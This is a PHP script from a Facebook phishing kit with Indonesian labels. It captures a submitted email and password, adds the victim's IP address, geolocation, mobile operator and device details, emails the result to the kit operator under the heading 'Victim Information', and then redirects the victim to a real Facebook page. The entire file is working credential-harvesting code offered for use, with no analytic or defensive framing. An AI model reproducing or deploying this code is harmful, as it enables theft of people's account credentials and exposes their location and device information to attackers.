<?php
if(isset($_POST['email']) || isset($_POST['password'])){

$email = $_POST['email'];
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];

include "gcode/geolocation.php";
include "email.php";

$subject = "[ $gcodeExec2[gcodeFlag] | $gcodeExec2[gcodeDial]  | $email ]";
$message = '
<center> 
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Korban</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>IP Address</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec['query'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Country</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec['country'].' '.$gcodeExec2['gcodeFlag'].'</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Akun</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Email/No Telp/Username</th>
<th style="width: 78%; text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Password</th>
<th style="width: 78%; text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Operator</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec3['operator'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Login</th>
<th style="width: 78%; text-align: center;"><b>FACEBOOK</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Tambahan</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Country</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec['country'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Region</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec['regionName'].'</th>
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>City</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec['city'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Latitude</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec['lat'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Longitude</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec['lon'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Waktu Masuk</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec2['gcodeTime'].'</th>
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Perangkat</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Browser</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec4['browser_family'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Browser Version</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec4['client']['version'].'</th>
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Device Brand</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec4['device']['brand'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Device Model</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec4['device']['model'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Device Type</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec4['device']['type'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Device OS</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec4['os']['name'].'</th>
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>OS Version</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec4['os']['version'].'</th>
</tr>
</table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="float: left; margin-top: 3%;">
Temukan saya: g-code.web.id
</div>
<div style="float: right;">
<img style="margin: 5px;" width="30" src="https://i.ibb.co/M5LvZfK/fb.png">
<img style="margin: 5px;" width="30" src="https://i.ibb.co/k1fsCW3/ig.png">
<img style="margin: 5px;" width="30" src="https://i.ibb.co/xLgTdXs/twitter.png">
</div>
</div>
</center>
';
$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: G-Code | VIP <result@g-code.co.id>' . "\r\n";
$gcodeExeSend = mail($myEmail, $subject, $message, $headersx);

if($gcodeExeSend){
    header("Location: https://www.facebook.com/oirbala/videos/3916996608525835/?app=fbl");
}

}